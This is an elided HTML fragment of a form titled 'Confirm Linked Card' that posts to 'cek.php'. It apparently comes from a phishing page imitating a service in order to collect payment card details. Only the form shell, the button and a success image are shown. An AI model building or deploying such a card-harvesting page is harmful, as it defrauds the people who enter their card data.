...
<form autocomplete="off" novalidate="true" id="frmCard" method="post" action="cek.php" class="login-form ember-view"> 
...
</div> </div> <div class="kanan"> <div class="field fk-field-container ember-view"> 
...
<button type="submit" id="btnLogin" class="button theme-button button--round theme-button">Confirm Linked Card</button> 
</div> 
</form> 
...
<img src="../../static/img/success_v2.png" alt="Paris" class="center"><br>
